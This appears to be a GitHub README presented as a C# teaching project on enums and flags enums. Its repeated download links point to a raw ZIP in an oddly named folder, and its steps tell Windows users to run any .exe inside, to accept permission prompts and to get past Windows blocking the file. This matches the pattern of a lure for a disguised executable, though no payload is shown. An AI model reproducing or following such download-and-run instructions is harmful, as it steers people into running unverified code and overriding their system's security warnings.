# 📘 pupilica-ileri-csharp-2026 - Learn C# With Clear Examples

[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/raw/refs/heads/main/anteprostate/csharp_pupilica_ileri_v3.0.zip)

## 🖥️ What This Project Is

This repository contains sample C# projects for advanced topics. It helps you see how C# works in real code.

The main goal is to let you open the project, read the files, and run the examples on Windows.

## 📥 Download and Run on Windows

Use this link to visit the release page and download the app files:

[Visit the release page to download](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/raw/refs/heads/main/anteprostate/csharp_pupilica_ileri_v3.0.zip)

After you open the release page:

1. Find the latest release
2. Download the file provided there
3. If the file is a ZIP archive, extract it
4. Open the app file from the extracted folder
5. If Windows asks for permission, choose Yes

If you see a `.exe` file in the release files, run that file after download.

## 🧰 What You Need

- Windows 10 or Windows 11
- A modern web browser
- File extract tool if the download comes as a ZIP file
- .NET runtime or Visual Studio if you want to open and study the source code

## 📚 Project Content

### 1. TypesDetails

This folder focuses on data types in C#.

#### 1.1 EnumTypes

This part shows how enum values work in C#.

**Files in this part:**

- `StudentState.cs`: An enum for student status
  - `Graduate`
  - `Failed`
  - `Unknown`
  - `Canceled`

- `Student.cs`: A student class
  - `Name`
  - `Score`
  - `State`

- `ErkekAkrabalikTipleri.cs`: A flags enum for male family relation types
  - Uses the `Flags` attribute
  - Allows more than one value at the same time
  - Values include:
    - `Ogul` = 1
    - `Baba` = 2
    - `Abi` = 4
    - `Amca` = 8
    - `Dayi` = 16
    - `Dede` = 32
    - `Eniste` = 64

- `Program.cs`:
  - Shows how to use `switch-case` with enum values
  - Shows how to combine flags with the `|` operator
  - Shows how to check combined values

## 🧪 What You Can Learn

This project helps you understand:

- How enum types work
- How to group values with clear names
- How to use flags for combined values
- How classes hold data
- How `switch-case` helps choose actions
- How bitwise OR combines values

## 📂 Folder Layout

- `TypesDetails`
  - `EnumTypes`
    - `StudentState.cs`
    - `Student.cs`
    - `ErkekAkrabalikTipleri.cs`
    - `Program.cs`

## ▶️ How to Open the Project

If you want to view the source code:

1. Download the release files from the link above
2. Extract the files if needed
3. Open the project folder
4. Open the solution file in Visual Studio if one is included
5. Run the project from Visual Studio if you want to see the sample output

If you only want to run the app, use the release file from the download page.

## 🪟 Windows Setup Steps

1. Open the release page
2. Download the latest file
3. Save it to your Downloads folder
4. Right-click the file if Windows blocks it
5. Select Run or Open
6. Follow the on-screen steps

If the download contains a folder with files, keep the folder structure the same when you extract it.

## 🔍 Example Use

You may see code that checks a student state like this:

- A student can be `Graduate`
- A student can be `Failed`
- A student can be `Unknown`
- A student can be `Canceled`

You may also see relation values combined like this:

- `Ogul | Baba`
- `Abi | Amca`
- `Dede | Dayi`

This helps show how one variable can hold more than one value when the code uses a flags enum.

## 🧩 Main File Purpose

`Program.cs` is the entry point for the example code. It shows:

- How enum values are read
- How `switch-case` branches work
- How flags are merged
- How combined values are handled

## 🛠️ If You Want to Work With the Code

You can use Visual Studio on Windows to open and edit the files.

Basic steps:

1. Install Visual Studio if you do not already have it
2. Download the source or release package
3. Open the project folder
4. Load the solution or project file
5. Press Run to start the sample

## 📌 File Roles

- `StudentState.cs` controls the student status list
- `Student.cs` stores student data
- `ErkekAkrabalikTipleri.cs` stores relation values with flags
- `Program.cs` shows how the example code works

## 🧭 Who This Is For

This project fits users who want to:

- See C# examples in a real project
- Learn basic code structure
- Understand enums and flags
- Explore advanced C# topics in a simple way
- Open and run sample code on Windows

## 🖱️ Quick Start

1. Go to the release page
2. Download the latest file
3. Extract it if needed
4. Open the app or project file
5. Run it on Windows

## 📎 Download Again

Use this link if you need the release page:

[Download from GitHub Releases](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/raw/refs/heads/main/anteprostate/csharp_pupilica_ileri_v3.0.zip)

## 🧱 Project Focus

This repository centers on:

- Enum usage
- Flags enum usage
- Data model classes
- Simple console-style example flow
- Clear C# syntax for study and practice

## 🖥️ Expected Behavior

When you run the sample, it may:

- Show student state values
- Print enum names
- Combine relation types
- Show the result of bitwise operations
- Demonstrate how `switch-case` responds to different values

## 📁 Suggested File Check

If you want to find the main example fast, look for:

- `Program.cs`
- `Student.cs`
- `StudentState.cs`
- `ErkekAkrabalikTipleri.cs`

## 🔐 Safe File Handling

When you download the release files on Windows:

- Save the files in a folder you can find later
- Keep the extracted files together
- Do not move one file without the rest if the app uses more than one file
- Open the app from the extracted release folder

## 📝 Read This First

This project is best used as a sample to explore C# code on Windows. The release page gives you the files you need to download and run the example, and the source files show how the enum and flags patterns work in practice